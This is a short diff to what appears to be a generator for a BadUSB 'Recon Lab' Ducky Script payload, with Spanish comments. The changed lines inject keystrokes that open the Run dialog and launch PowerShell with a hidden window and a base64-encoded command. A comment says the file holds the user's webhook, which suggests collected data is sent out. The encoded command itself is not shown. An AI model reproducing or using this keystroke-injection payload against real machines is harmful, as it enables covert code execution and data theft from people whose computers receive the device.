@@ -93,9 +93,13 @@ REM BadUSB Recon Lab — Payload generado automáticamente
 REM Fecha: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
 REM IMPORTANTE: no subir este archivo al repo (contiene tu webhook)
 
-DELAY 2000
+DUCKY_LANG es
+DELAY 1000
 GUI r
-DELAY 800
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1200
 STRING powershell -WindowStyle Hidden -EncodedCommand $b64
 ENTER
 "@
